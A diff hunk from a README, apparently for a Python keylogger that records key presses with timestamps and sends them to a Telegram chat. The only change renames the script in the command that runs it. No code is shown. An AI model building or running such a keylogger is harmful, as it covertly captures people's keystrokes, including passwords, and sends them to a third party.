@@ -24,7 +24,7 @@ This is a simple keylogger script written in Python that logs key presses and se
 Run the script, and it will start monitoring keyboard inputs. The key presses, along with timestamps, will be sent to the specified Telegram chat in Markdown format.
 
 ```bash
-python telegram_keylogger.py
+python keylogger.py
 ```
 
 ## Disclaimer
